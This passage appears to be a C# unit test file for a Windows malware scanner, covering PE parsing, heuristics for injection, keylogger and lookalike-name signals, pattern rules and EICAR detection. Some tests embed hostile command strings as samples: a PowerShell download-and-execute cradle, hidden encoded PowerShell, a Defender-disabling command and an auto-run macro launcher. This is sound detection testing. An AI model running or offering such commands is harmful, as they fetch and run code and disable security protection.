using System.Buffers.Binary;
using System.Security.Cryptography;
using System.Text;
using Nexus.Core;
using Nexus.Security;
using Nexus.Security.Scanner;
using Nexus.WindowsActions;
using Nexus.WindowsActions.Registry;

namespace Nexus.Tests.Modules;

/// <summary>Monta executáveis PE mínimos (PE32+) byte a byte, para testar o leitor e a heurística sem binários reais.</summary>
internal sealed class PeBuilder
{
    public const uint Code = 0x00000020, Exec = 0x20000000, Read = 0x40000000, Write = 0x80000000, InitData = 0x00000040;

    private readonly List<(string Name, uint Flags, byte[] Data)> _sections = [];
    private readonly List<(string Dll, string[] Functions)> _imports = [];
    public uint TimeDateStamp { get; set; } = 1_700_000_000; // 2023
    public bool Repro { get; set; }
    public byte[] Overlay { get; set; } = [];
    public int CertificateBytes { get; set; }
    public ushort Subsystem { get; set; } = 2;

    public PeBuilder Section(string name, uint flags, byte[] data) { _sections.Add((name, flags, data)); return this; }
    public PeBuilder Import(string dll, params string[] functions) { _imports.Add((dll, functions)); return this; }

    private const int FileAlign = 0x200, SectionAlign = 0x1000, HeadersSize = 0x400;

    private static int Align(int v, int a) => (v + a - 1) / a * a;

    public byte[] Build()
    {
        var sections = new List<(string Name, uint Flags, byte[] Data)>(_sections);
        if (sections.Count == 0) sections.Add((".text", Code | Exec | Read, Enumerable.Repeat((byte)0x90, 512).ToArray()));
        var importIndex = -1;
        var debugIndex = -1;
        // Seções extras montadas depois de saber o endereço virtual (RVA) delas.
        if (_imports.Count > 0) { importIndex = sections.Count; sections.Add((".idata", InitData | Read | Write, [])); }
        if (Repro) { debugIndex = sections.Count; sections.Add((".rdata", InitData | Read, [])); }
        // Passo de 1 MB entre seções: nenhuma seção de teste passa disso, então os endereços virtuais nunca se sobrepõem.
        static uint VaOf(int i) => (uint)(0x100000 * (i + 1));
        if (importIndex >= 0) sections[importIndex] = (".idata", InitData | Read | Write, BuildImports(VaOf(importIndex)));
        if (debugIndex >= 0)
        {
            var dbg = new byte[28];
            BinaryPrimitives.WriteUInt32LittleEndian(dbg.AsSpan(12), 16); // IMAGE_DEBUG_TYPE_REPRO
            sections[debugIndex] = (".rdata", InitData | Read, dbg);
        }

        var raw = HeadersSize;
        var layout = new List<(int Raw, int RawSize)>();
        foreach (var s in sections)
        {
            var size = Align(Math.Max(s.Data.Length, 1), FileAlign);
            layout.Add((raw, size));
            raw += size;
        }
        var endOfImage = raw;
        var total = endOfImage + Overlay.Length + CertificateBytes;
        var f = new byte[total];
        f[0] = (byte)'M'; f[1] = (byte)'Z';
        BinaryPrimitives.WriteUInt32LittleEndian(f.AsSpan(0x3C), 0x40);
        var pe = 0x40;
        BinaryPrimitives.WriteUInt32LittleEndian(f.AsSpan(pe), 0x00004550);
        var coff = pe + 4;
        BinaryPrimitives.WriteUInt16LittleEndian(f.AsSpan(coff), 0x8664);
        BinaryPrimitives.WriteUInt16LittleEndian(f.AsSpan(coff + 2), (ushort)sections.Count);
        BinaryPrimitives.WriteUInt32LittleEndian(f.AsSpan(coff + 4), TimeDateStamp);
        BinaryPrimitives.WriteUInt16LittleEndian(f.AsSpan(coff + 16), 240);
        BinaryPrimitives.WriteUInt16LittleEndian(f.AsSpan(coff + 18), 0x0022);
        var opt = coff + 20;
        BinaryPrimitives.WriteUInt16LittleEndian(f.AsSpan(opt), 0x20b);
        BinaryPrimitives.WriteUInt32LittleEndian(f.AsSpan(opt + 16), VaOf(0)); // ponto de entrada no começo da 1ª seção
        BinaryPrimitives.WriteUInt64LittleEndian(f.AsSpan(opt + 24), 0x140000000);
        BinaryPrimitives.WriteUInt32LittleEndian(f.AsSpan(opt + 32), SectionAlign);
        BinaryPrimitives.WriteUInt32LittleEndian(f.AsSpan(opt + 36), FileAlign);
        BinaryPrimitives.WriteUInt32LittleEndian(f.AsSpan(opt + 56), VaOf(sections.Count));
        BinaryPrimitives.WriteUInt32LittleEndian(f.AsSpan(opt + 60), HeadersSize);
        BinaryPrimitives.WriteUInt16LittleEndian(f.AsSpan(opt + 68), Subsystem);
        BinaryPrimitives.WriteUInt32LittleEndian(f.AsSpan(opt + 108), 16);
        var dirs = opt + 112;
        if (importIndex >= 0)
        {
            BinaryPrimitives.WriteUInt32LittleEndian(f.AsSpan(dirs + 8), VaOf(importIndex));
            BinaryPrimitives.WriteUInt32LittleEndian(f.AsSpan(dirs + 12), (uint)((_imports.Count + 1) * 20));
        }
        if (CertificateBytes > 0)
        {
            BinaryPrimitives.WriteUInt32LittleEndian(f.AsSpan(dirs + 32), (uint)(endOfImage + Overlay.Length));
            BinaryPrimitives.WriteUInt32LittleEndian(f.AsSpan(dirs + 36), (uint)CertificateBytes);
        }
        if (debugIndex >= 0)
        {
            BinaryPrimitives.WriteUInt32LittleEndian(f.AsSpan(dirs + 48), VaOf(debugIndex));
            BinaryPrimitives.WriteUInt32LittleEndian(f.AsSpan(dirs + 52), 28);
        }
        var table = opt + 240;
        for (var i = 0; i < sections.Count; i++)
        {
            var s = table + (i * 40);
            var name = Encoding.ASCII.GetBytes(sections[i].Name);
            name.AsSpan(0, Math.Min(8, name.Length)).CopyTo(f.AsSpan(s));
            BinaryPrimitives.WriteUInt32LittleEndian(f.AsSpan(s + 8), (uint)Math.Max(sections[i].Data.Length, 1));
            BinaryPrimitives.WriteUInt32LittleEndian(f.AsSpan(s + 12), VaOf(i));
            BinaryPrimitives.WriteUInt32LittleEndian(f.AsSpan(s + 16), (uint)layout[i].RawSize);
            BinaryPrimitives.WriteUInt32LittleEndian(f.AsSpan(s + 20), (uint)layout[i].Raw);
            BinaryPrimitives.WriteUInt32LittleEndian(f.AsSpan(s + 36), sections[i].Flags);
            sections[i].Data.CopyTo(f.AsSpan(layout[i].Raw));
        }
        Overlay.CopyTo(f.AsSpan(endOfImage));
        return f;
    }

    private byte[] BuildImports(uint va)
    {
        var buf = new List<byte>(new byte[(_imports.Count + 1) * 20]);
        var descriptors = new (uint Ilt, uint Name)[_imports.Count];
        for (var i = 0; i < _imports.Count; i++)
        {
            var (dll, functions) = _imports[i];
            var nameRvas = new List<uint>();
            foreach (var fn in functions)
            {
                nameRvas.Add(va + (uint)buf.Count);
                buf.AddRange([0, 0]);
                buf.AddRange(Encoding.ASCII.GetBytes(fn));
                buf.Add(0);
                if (buf.Count % 2 == 1) buf.Add(0);
            }
            var dllRva = va + (uint)buf.Count;
            buf.AddRange(Encoding.ASCII.GetBytes(dll));
            buf.Add(0);
            while (buf.Count % 8 != 0) buf.Add(0);
            var ilt = va + (uint)buf.Count;
            foreach (var r in nameRvas) buf.AddRange(BitConverter.GetBytes((ulong)r));
            buf.AddRange(new byte[8]);
            descriptors[i] = (ilt, dllRva);
        }
        var bytes = buf.ToArray();
        for (var i = 0; i < descriptors.Length; i++)
        {
            BinaryPrimitives.WriteUInt32LittleEndian(bytes.AsSpan(i * 20), descriptors[i].Ilt);
            BinaryPrimitives.WriteUInt32LittleEndian(bytes.AsSpan((i * 20) + 12), descriptors[i].Name);
            BinaryPrimitives.WriteUInt32LittleEndian(bytes.AsSpan((i * 20) + 16), descriptors[i].Ilt);
        }
        return bytes;
    }

    public static byte[] Random(int length, int seed = 7)
    {
        var b = new byte[length];
        new Random(seed).NextBytes(b);
        return b;
    }
}

internal sealed class FakeSignatures(bool? result) : ISignatureChecker
{
    public int Calls { get; private set; }
    public bool? IsSigned(string path) { Calls++; return result; }
}

internal static class ScannerSamples
{
    /// <summary>O arquivo de teste EICAR, montado em tempo de execução (o fonte não contém a sequência inteira).</summary>
    public static byte[] Eicar()
    {
        var parts = new[] { @"X5O!P%@AP[4\PZX54(P^)7CC)7}$", "EICAR-STANDARD-", "ANTIVIRUS-TEST-FILE!$H+H*" };
        return Encoding.ASCII.GetBytes(string.Concat(parts));
    }

    public static ScanEngine Engine(bool? signed = null, IgnoreList? ignore = null, ScanOptions? options = null) =>
        new(HashDatabase.LoadBuiltIn(), RuleSet.LoadBuiltIn(), new FakeSignatures(signed), options ?? new ScanOptions { WindowsDirectory = @"C:\Windows", UtcNow = () => Now }, ignore);

    public static readonly DateTime Now = new(2026, 10, 31, 12, 0, 0, DateTimeKind.Utc);

    public static string Sha(byte[] b) => Convert.ToHexStringLower(SHA256.HashData(b));
}

[Trait("Category", "Unit")]
public sealed class ScannerPeParserTests
{
    [Fact]
    public void Parses_headers_sections_imports_and_entry()
    {
        var bytes = new PeBuilder()
            .Section(".text", PeBuilder.Code | PeBuilder.Exec | PeBuilder.Read, Enumerable.Repeat((byte)0xCC, 1000).ToArray())
            .Section(".data", PeBuilder.InitData | PeBuilder.Read | PeBuilder.Write, new byte[300])
            .Import("KERNEL32.dll", "VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread")
            .Import("USER32.dll", "SetWindowsHookExW", "GetAsyncKeyState")
            .Build();
        var pe = PeFile.TryParse(bytes, bytes.Length);
        Assert.NotNull(pe);
        Assert.True(pe.Is64);
        Assert.Equal(0x8664, pe.Machine);
        Assert.Equal([".text", ".data", ".idata"], pe.Sections.Select(s => s.Name));
        Assert.True(pe.Sections[0].IsExecutable);
        Assert.False(pe.Sections[0].IsWritable);
        Assert.Equal(".text", pe.EntrySection?.Name);
        Assert.Equal(["kernel32.dll", "user32.dll"], pe.Imports.Select(i => i.Dll));
        Assert.Contains("CreateRemoteThread", pe.ImportedFunctions);
        Assert.Contains("SetWindowsHookExW", pe.ImportedFunctions);
        Assert.Equal(0, pe.OverlaySize);
        Assert.False(pe.HasEmbeddedSignature);
        Assert.False(pe.IsDotNet);
    }

    [Fact]
    public void Overlay_excludes_certificate_table_and_repro_is_detected()
    {
        var bytes = new PeBuilder { Overlay = new byte[5000], CertificateBytes = 3000, Repro = true }.Build();
        var pe = PeFile.TryParse(bytes, bytes.Length)!;
        Assert.Equal(5000, pe.OverlaySize);
        Assert.True(pe.HasEmbeddedSignature);
        Assert.True(pe.HasReproDebugEntry);
    }

    [Fact]
    public void Rejects_garbage_and_never_throws_on_truncation()
    {
        Assert.Null(PeFile.TryParse([], 0));
        Assert.Null(PeFile.TryParse(Encoding.ASCII.GetBytes("MZ"), 2));
        Assert.Null(PeFile.TryParse(PeBuilder.Random(4096), 4096));
        var bad = new byte[512];
        bad[0] = (byte)'M'; bad[1] = (byte)'Z';
        BinaryPrimitives.WriteUInt32LittleEndian(bad.AsSpan(0x3C), 0x7FFFFFF0);
        Assert.Null(PeFile.TryParse(bad, bad.Length));

        var good = new PeBuilder().Import("kernel32.dll", "LoadLibraryA", "GetProcAddress").Build();
        for (var len = 0; len <= good.Length; len += 7)
            _ = PeFile.TryParse(good.AsSpan(0, len), good.Length); // nenhum tamanho parcial lança
        // Parcial: cabeçalho e seções ainda são lidos; entropia fica indeterminada para o que não foi lido.
        var partial = PeFile.TryParse(good.AsSpan(0, 0x400), good.Length);
        Assert.NotNull(partial);
        Assert.True(double.IsNaN(partial.Sections[0].Entropy));
    }

    [Fact]
    public void Shannon_entropy_bounds()
    {
        Assert.Equal(0, ShannonEntropy.Of(new byte[1000]));
        Assert.Equal(8, ShannonEntropy.Of(Enumerable.Range(0, 256 * 4).Select(i => (byte)i).ToArray()), 6);
        Assert.Equal(1, ShannonEntropy.Of(Enumerable.Range(0, 1000).Select(i => (byte)(i % 2)).ToArray()), 6);
        Assert.True(ShannonEntropy.Of(PeBuilder.Random(64 * 1024)) > 7.9);
        Assert.True(ShannonEntropy.Of(Encoding.ASCII.GetBytes(string.Concat(Enumerable.Repeat("int main() { return 0; } ", 200)))) < 5);
    }
}

[Trait("Category", "Unit")]
public sealed class ScannerHeuristicsTests
{
    private static FileContext Ctx(string path, PathZone zone, DateTime? created = null) =>
        new(path, 1000, created ?? ScannerSamples.Now.AddYears(-1), zone, ScannerSamples.Now);

    [Fact]
    public void Injection_keylogger_wx_entropy_and_packer_signals()
    {
        var bytes = new PeBuilder()
            .Section("UPX1", PeBuilder.Code | PeBuilder.Exec | PeBuilder.Read | PeBuilder.Write, PeBuilder.Random(16 * 1024))
            .Import("kernel32.dll", "VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread")
            .Import("user32.dll", "SetWindowsHookExA", "GetAsyncKeyState", "GetForegroundWindow")
            .Build();
        var pe = PeFile.TryParse(bytes, bytes.Length)!;
        var ids = PeHeuristics.Analyze(pe, Ctx(@"C:\Jogos\x.exe", PathZone.Other)).Select(h => h.RuleId).ToList();
        Assert.Contains("pe.wx-section", ids);
        Assert.Contains("pe.high-entropy", ids);
        Assert.Contains("pe.packer-section", ids);
        Assert.Contains("pe.imports-injection", ids);
        Assert.Contains("pe.imports-keylogger", ids);
    }

    [Fact]
    public void Ordinary_program_has_no_signals()
    {
        var code = Encoding.ASCII.GetBytes(string.Concat(Enumerable.Repeat("mov eax, 1; ret; push rbp; ", 400)));
        var bytes = new PeBuilder()
            .Section(".text", PeBuilder.Code | PeBuilder.Exec | PeBuilder.Read, code)
            .Import("kernel32.dll", "CreateFileW", "ReadFile", "WriteFile", "CloseHandle", "ExitProcess", "GetLastError", "HeapAlloc")
            .Build();
        var pe = PeFile.TryParse(bytes, bytes.Length)!;
        Assert.Empty(PeHeuristics.Analyze(pe, Ctx(@"C:\Program Files\App\app.exe", PathZone.ProgramFiles)));
    }

    [Fact]
    public void Timestamp_in_future_flags_unless_reproducible_build()
    {
        var future = (uint)(new DateTimeOffset(2031, 1, 1, 0, 0, 0, TimeSpan.Zero).ToUnixTimeSeconds());
        var a = PeFile.TryParse(new PeBuilder { TimeDateStamp = future }.Build(), 0)!;
        Assert.Contains(PeHeuristics.Analyze(a, Ctx(@"D:\a.exe", PathZone.Other)), h => h.RuleId == "pe.timestamp");
        var b = PeFile.TryParse(new PeBuilder { TimeDateStamp = future, Repro = true }.Build(), 0)!;
        Assert.DoesNotContain(PeHeuristics.Analyze(b, Ctx(@"D:\a.exe", PathZone.Other)), h => h.RuleId == "pe.timestamp");
    }

    [Fact]
    public void Minimal_imports_and_large_overlay()
    {
        var bytes = new PeBuilder { Overlay = new byte[3 * 1024 * 1024] }.Import("kernel32.dll", "LoadLibraryA", "GetProcAddress").Build();
        var ids = PeHeuristics.Analyze(PeFile.TryParse(bytes, bytes.Length)!, Ctx(@"D:\a.exe", PathZone.Other)).Select(h => h.RuleId).ToList();
        Assert.Contains("pe.imports-minimal", ids);
        Assert.Contains("pe.large-overlay", ids);
    }

    [Theory]
    [InlineData(@"C:\Users\a\Downloads\svchost.exe", PathZone.Downloads, "pe.system-name")]
    [InlineData(@"C:\Users\a\AppData\Roaming\scvhost.exe", PathZone.UserAppData, "pe.lookalike-name")]
    [InlineData(@"C:\Users\a\AppData\Roaming\svch0st.exe", PathZone.UserAppData, "pe.lookalike-name")]
    [InlineData(@"C:\Users\a\AppData\Roaming\Isass.exe", PathZone.UserAppData, "pe.lookalike-name")]
    public void Names_imitating_system_processes(string path, PathZone zone, string rule)
    {
        var pe = PeFile.TryParse(new PeBuilder().Build(), 0)!;
        Assert.Contains(PeHeuristics.Analyze(pe, Ctx(path, zone)), h => h.RuleId == rule);
    }

    [Theory]
    [InlineData("svchost")]
    [InlineData("service")]
    [InlineData("notepad")]
    [InlineData("chrome")]
    [InlineData("steam")]
    public void Lookalike_does_not_flag_real_or_unrelated_names(string name) => Assert.Null(PeHeuristics.LookalikeOf(name));

    [Fact]
    public void System_name_inside_windows_is_fine()
    {
        var pe = PeFile.TryParse(new PeBuilder().Import("kernel32.dll", "CreateFileW", "ReadFile", "CloseHandle", "Sleep", "ExitProcess", "GetLastError", "HeapFree").Build(), 0)!;
        Assert.Empty(PeHeuristics.Analyze(pe, Ctx(@"C:\Windows\System32\svchost.exe", PathZone.System)));
    }

    [Theory]
    [InlineData("fatura.pdf.exe", "name.double-extension")]
    [InlineData("Boleto.PDF .scr", "name.double-extension")]
    [InlineData("foto          .exe", "name.space-padding")]
    [InlineData("fatura\u202Efdp.exe", "name.rtlo")]
    public void Name_tricks_are_flagged(string name, string rule) => Assert.Contains(NameHeuristics.Analyze(name), h => h.RuleId == rule);

    [Theory]
    [InlineData("setup.exe")]
    [InlineData("relatorio.final.pdf")]
    [InlineData("jogo v1.2.exe")]
    [InlineData("backup.tar.gz")]
    public void Ordinary_names_are_not_flagged(string name) => Assert.Empty(NameHeuristics.Analyze(name));
}

[Trait("Category", "Unit")]
public sealed class ScannerPatternRuleTests
{
    private static RuleSet Rules(string rulesJson) { var r = new RuleSet(); r.Add($"{{\"schema\":\"nexus.scanrules/1\",\"rules\":[{rulesJson}]}}"); return r; }

    private static bool Match(RuleSet set, byte[] data, PeFile? pe = null) => set.Rules[0].Matches(data, pe);

    [Fact]
    public void Hex_with_wildcards_and_jumps()
    {
        var set = Rules("""{"id":"t.hex","title":"t","why":"w","points":10,"strings":[{"id":"a","hex":"4D 5A ?? ?? [2-4] 50 45"}]}""");
        Assert.True(Match(set, [0, 0x4D, 0x5A, 1, 2, 9, 9, 0x50, 0x45]));        // salto de 2
        Assert.True(Match(set, [0x4D, 0x5A, 1, 2, 9, 9, 9, 9, 0x50, 0x45, 0]));   // salto de 4
        Assert.False(Match(set, [0x4D, 0x5A, 1, 2, 9, 0x50, 0x45]));              // salto de 1: curto demais
        Assert.False(Match(set, [0x4D, 0x5A, 1, 2, 9, 9, 9, 9, 9, 0x50, 0x45])); // salto de 5: longo demais
    }

    [Fact]
    public void Text_nocase_and_utf16()
    {
        var set = Rules("""{"id":"t.txt","title":"t","why":"w","points":10,"strings":[{"id":"a","text":"Invoke-Expression","nocase":true,"wide":true}]}""");
        Assert.True(Match(set, Encoding.ASCII.GetBytes("x = INVOKE-EXPRESSION $y")));
        Assert.True(Match(set, Encoding.Unicode.GetBytes("abc invoke-expression def")));
        Assert.False(Match(set, Encoding.ASCII.GetBytes("Invoke-Expressio")));
        var cs = Rules("""{"id":"t.cs","title":"t","why":"w","points":10,"strings":[{"id":"a","text":"AutoOpen"}]}""");
        Assert.False(Match(cs, Encoding.ASCII.GetBytes("autoopen")));
        var wideOnly = Rules("""{"id":"t.w","title":"t","why":"w","points":10,"strings":[{"id":"a","text":"_VBA_PROJECT","wide":true,"ascii":false}]}""");
        Assert.False(Match(wideOnly, Encoding.ASCII.GetBytes("_VBA_PROJECT")));
        Assert.True(Match(wideOnly, Encoding.Unicode.GetBytes("_VBA_PROJECT")));
    }

    [Fact]
    public void Conditions_n_of_not_and_wildcard_sets()
    {
        const string strings = """[{"id":"a1","text":"alpha"},{"id":"a2","text":"beta"},{"id":"b","text":"gamma"},{"id":"c","text":"delta"}]""";
        RuleSet With(string cond) => Rules($$"""{"id":"t.c","title":"t","why":"w","points":10,"strings":{{strings}},"condition":"{{cond}}"}""");
        var ab = Encoding.ASCII.GetBytes("alpha ... beta");
        var abg = Encoding.ASCII.GetBytes("alpha beta gamma");
        Assert.True(Match(With("2 of them"), ab));
        Assert.False(Match(With("3 of them"), ab));
        Assert.True(Match(With("all of ($a*)"), ab));
        Assert.False(Match(With("all of ($a*) and not $b"), abg));
        Assert.True(Match(With("any of ($b, $c) or ($a1 and $a2)"), ab));
        Assert.True(Match(With("2 of ($a1, $b, $c)"), abg));
        Assert.False(Match(With("$c"), abg));
    }

    [Fact]
    public void Offset_and_section_constraints()
    {
        var at = Rules("""{"id":"t.at","title":"t","why":"w","points":10,"strings":[{"id":"m","hex":"D0 CF 11 E0","at":0}]}""");
        Assert.True(Match(at, [0xD0, 0xCF, 0x11, 0xE0, 0]));
        Assert.False(Match(at, [0, 0xD0, 0xCF, 0x11, 0xE0]));

        var marker = Encoding.ASCII.GetBytes("NEXUSMARK");
        var text = new byte[600];
        marker.CopyTo(text, 100);
        var bytes = new PeBuilder().Section(".text", PeBuilder.Code | PeBuilder.Exec | PeBuilder.Read, text).Section(".data", PeBuilder.InitData | PeBuilder.Read, new byte[100]).Build();
        var pe = PeFile.TryParse(bytes, bytes.Length);
        var inText = Rules("""{"id":"t.s","title":"t","why":"w","points":10,"strings":[{"id":"m","text":"NEXUSMARK","section":".text"}]}""");
        var inData = Rules("""{"id":"t.s","title":"t","why":"w","points":10,"strings":[{"id":"m","text":"NEXUSMARK","section":".data"}]}""");
        var inEntry = Rules("""{"id":"t.s","title":"t","why":"w","points":10,"strings":[{"id":"m","text":"NEXUSMARK","section":"entry"}]}""");
        var inOverlay = Rules("""{"id":"t.s","title":"t","why":"w","points":10,"strings":[{"id":"m","text":"NEXUSMARK","section":"overlay"}]}""");
        Assert.True(Match(inText, bytes, pe));
        Assert.True(Match(inEntry, bytes, pe));
        Assert.False(Match(inData, bytes, pe));
        Assert.False(Match(inOverlay, bytes, pe));
        Assert.False(Match(inText, bytes, pe: null)); // seção exige PE
        var withOverlay = new PeBuilder { Overlay = marker }.Build();
        Assert.True(Match(inOverlay, withOverlay, PeFile.TryParse(withOverlay, withOverlay.Length)));
    }

    [Theory]
    [InlineData("""{"id":"t.x","title":"t","why":"w","points":10,"strings":[{"id":"a","text":"x"}],"condition":"$b"}""")]
    [InlineData("""{"id":"t.x","title":"t","why":"w","points":10,"strings":[{"id":"a","hex":"[2] 4D"}]}""")]
    [InlineData("""{"id":"t.x","title":"t","why":"w","points":10,"strings":[{"id":"a","hex":"4D ZZ"}]}""")]
    [InlineData("""{"id":"t.x","title":"t","points":10,"strings":[{"id":"a","text":"x"}]}""")]
    [InlineData("""{"id":"T X","title":"t","why":"w","points":10,"strings":[{"id":"a","text":"x"}]}""")]
    [InlineData("""{"id":"t.x","title":"t","why":"w","points":10,"strings":[{"id":"a","text":"x","hex":"41"}]}""")]
    [InlineData("""{"id":"t.x","title":"t","why":"w","points":10,"strings":[{"id":"a","text":"x"}],"condition":"2 of"}""")]
    [InlineData("""{"id":"t.x","title":"t","why":"w","points":10,"strings":[{"id":"a","hex":"41 [1-2000] 42"}]}""")]
    public void Invalid_rules_are_refused(string rule) => Assert.Throws<FormatException>(() => Rules(rule));

    [Fact]
    public void Built_in_rules_load_and_explain_themselves()
    {
        var set = RuleSet.LoadBuiltIn();
        Assert.True(set.Rules.Count >= 8);
        Assert.All(set.Rules, r => { Assert.False(string.IsNullOrWhiteSpace(r.Why)); Assert.InRange(r.Points, 1, 100); });
        Assert.Contains(set.Rules, r => r.Id == "test.eicar" && r.Test);
    }

    private static List<string> Hits(string fileName, byte[] content)
    {
        var v = ScannerSamples.Engine().Evaluate(@"C:\Users\a\Downloads\" + fileName, content, true, content.Length, ScannerSamples.Sha(content), ScannerSamples.Now.AddYears(-1));
        return v.Hits.Select(h => h.RuleId).ToList();
    }

    [Fact]
    public void Download_cradle_and_encoded_powershell_are_detected()
    {
        Assert.Contains("script.download-execute", Hits("a.ps1", Encoding.ASCII.GetBytes("$x = (New-Object Net.WebClient).DownloadString('http://x/y'); IEX($x)")));
        Assert.Contains("script.download-execute", Hits("a.ps1", Encoding.Unicode.GetBytes("iex (iwr http://x/y -useb); Invoke-WebRequest")));
        Assert.Contains("script.powershell-encoded", Hits("a.bat", Encoding.ASCII.GetBytes("powershell.exe -NoP -W Hidden -Enc SQBFAFgA")));
        Assert.Contains("script.defender-tamper", Hits("a.cmd", Encoding.ASCII.GetBytes("powershell Set-MpPreference -DisableRealtimeMonitoring $true")));
    }

    [Fact]
    public void Ordinary_scripts_are_not_flagged()
    {
        Assert.Empty(Hits("build.ps1", Encoding.ASCII.GetBytes("Get-Content a.txt -Encoding UTF8 | Set-Content b.txt -Encoding UTF8\nInvoke-WebRequest https://x -OutFile y.zip")));
        Assert.Empty(Hits("run.bat", Encoding.ASCII.GetBytes("@echo off\r\npowershell -ExecutionPolicy Bypass -File .\\setup.ps1\r\n")));
    }

    [Fact]
    public void Lnk_calling_hidden_powershell_is_flagged_plain_shortcut_is_not()
    {
        byte[] Lnk(string args) => [0x4C, 0, 0, 0, 0x01, 0x14, 0x02, 0, .. new byte[68], .. Encoding.Unicode.GetBytes(args)];
        Assert.Contains("lnk.script-host", Hits("fatura.lnk", Lnk(@"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -c iex")));
        Assert.Contains("lnk.script-host", Hits("x.lnk", Lnk(@"C:\Windows\System32\mshta.exe vbscript:Execute")));
        Assert.Empty(Hits("Windows PowerShell.lnk", Lnk(@"%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe")));
    }

    [Fact]
    public void Old_office_document_with_autoexec_macro()
    {
        byte[] Doc(string body) => [0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1, .. new byte[100], .. Encoding.Unicode.GetBytes("_VBA_PROJECT"), .. Encoding.ASCII.GetBytes(body)];
        var hits = Hits("pedido.doc", Doc("Sub AutoOpen() ... CreateObject(\"WScript.Shell\").Run"));
        Assert.Contains("office.ole-autoexec-macro", hits);
        Assert.Contains("office.ole-macro-launcher", hits);
        Assert.Empty(Hits("carta.doc", Doc("Prezado cliente")));
    }
}

[Trait("Category", "Unit")]
public sealed class ScannerHashAndEngineTests
{
    [Fact]
    public void Hash_database_parses_open_formats()
    {
        var db = new HashDatabase();
        var text = """
            # comentário
            AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  Exemplo maiúsculo
            "2024-01-01 10:00:00","bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb","cccccccccccccccccccccccccccccccc","dddddddddddddddddddddddddddddddddddddddd","rep","x.exe"
            linha sem hash
            #! test
            eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee amostra de teste
            aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa repetida
            """;
        db.Add(new StringReader(text), "lista.txt", out var added, out var skipped);
        Assert.Equal(3, added);
        Assert.Equal(2, skipped);
        Assert.Equal(2, db.RealCount);
        Assert.Equal("Exemplo maiúsculo", db.Lookup(new string('a', 64))!.Label);
        Assert.NotNull(db.Lookup(new string('B', 64))); // CSV: vale o token de 64 hex (md5/sha1 têm outro tamanho)
        Assert.True(db.Lookup(new string('e', 64))!.Test);
        Assert.Null(db.Lookup(new string('c', 64)));
    }

    [Fact]
    public void Built_in_set_is_test_only_and_contains_eicar()
    {
        var db = HashDatabase.LoadBuiltIn();
        Assert.Equal(0, db.RealCount);
        Assert.True(db.Lookup(ScannerSamples.Sha(ScannerSamples.Eicar()))!.Test);
        Assert.True(db.Lookup(ScannerSamples.Sha(Encoding.ASCII.GetBytes("NEXUS-SCANNER-TEST-SAMPLE\n")))!.Test);
    }

    [Fact]
    public void Eicar_is_detected_as_test_sample()
    {
        var eicar = ScannerSamples.Eicar();
        var v = ScannerSamples.Engine().Evaluate(@"C:\Users\a\Downloads\eicar.com", eicar, true, eicar.Length, ScannerSamples.Sha(eicar), ScannerSamples.Now);
        Assert.Contains(v.Hits, h => h.RuleId == "test.eicar" && h.TestOnly);
        Assert.Contains(v.Hits, h => h.Layer == ScanLayer.Hash && h.TestOnly);
        Assert.True(v.IsTestSample);
        Assert.True(ScanEngine.IsFinding(v));
        Assert.Contains("teste", v.VerdictText, StringComparison.Ordinal);
        // Com conteúdo extra além de 128 bytes deixa de ser o arquivo de teste (padrão EICAR).
        var padded = eicar.Concat(new byte[200]).ToArray();
        var w = ScannerSamples.Engine().Evaluate(@"C:\x\eicar.txt", padded, true, padded.Length, ScannerSamples.Sha(padded), ScannerSamples.Now);
        Assert.False(ScanEngine.IsFinding(w));
    }

    [Fact]
    public void User_hash_list_match_is_known_bad()
    {
        var content = Encoding.ASCII.GetBytes("conteúdo qualquer");
        var db = new HashDatabase();
        db.Add(new StringReader(ScannerSamples.Sha(content) + "  minha-lista"), "minha.txt", out _, out _);
        var engine = new ScanEngine(db, new RuleSet(), NoSignatureChecker.Instance, new ScanOptions { UtcNow = () => ScannerSamples.Now });
        var v = engine.Evaluate(@"D:\x\a.dat", content, true, content.Length, ScannerSamples.Sha(content), ScannerSamples.Now);
        Assert.Equal(Verdict.KnownBad, v.Verdict);
        Assert.False(v.IsTestSample);
    }

    private static byte[] NastyPe() => new PeBuilder()
        .Section(".text", PeBuilder.Code | PeBuilder.Exec | PeBuilder.Read | PeBuilder.Write, PeBuilder.Random(16 * 1024))
        .Import("kernel32.dll", "VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread")
        .Build();

    [Fact]
    public void Valid_signature_caps_heuristics_to_avoid_false_positives()
    {
        var pe = NastyPe();
        var path = @"C:\Users\a\Downloads\ferramenta.exe";
        var signed = ScannerSamples.Engine(signed: true).Evaluate(path, pe, true, pe.Length, ScannerSamples.Sha(pe), ScannerSamples.Now.AddDays(-1));
        Assert.Equal(Verdict.Clean, signed.Verdict);
        Assert.True(signed.Score <= Scoring.SignedHeuristicCap);
        Assert.Contains(signed.Hits, h => h.RuleId == "pe.signed");
        Assert.True(signed.ValidSignature);

        var unsigned = ScannerSamples.Engine(signed: false).Evaluate(path, pe, true, pe.Length, ScannerSamples.Sha(pe), ScannerSamples.Now.AddDays(-1));
        Assert.Equal(Verdict.HighlySuspicious, unsigned.Verdict);
        Assert.Contains(unsigned.Hits, h => h.RuleId == "pe.unsigned" && h.Points == 15);
        Assert.Contains(unsigned.Hits, h => h.RuleId == "pe.fresh-risky-location");
    }

    [Fact]
    public void Signature_check_is_skipped_for_quiet_files_outside_risky_folders()
    {
        var bytes = new PeBuilder().Import("kernel32.dll", "CreateFileW", "ReadFile", "WriteFile", "CloseHandle", "ExitProcess", "Sleep", "GetTickCount").Build();
        var sig = new FakeSignatures(false);
        var engine = new ScanEngine(HashDatabase.LoadBuiltIn(), RuleSet.LoadBuiltIn(), sig, new ScanOptions { WindowsDirectory = @"C:\Windows", UtcNow = () => ScannerSamples.Now });
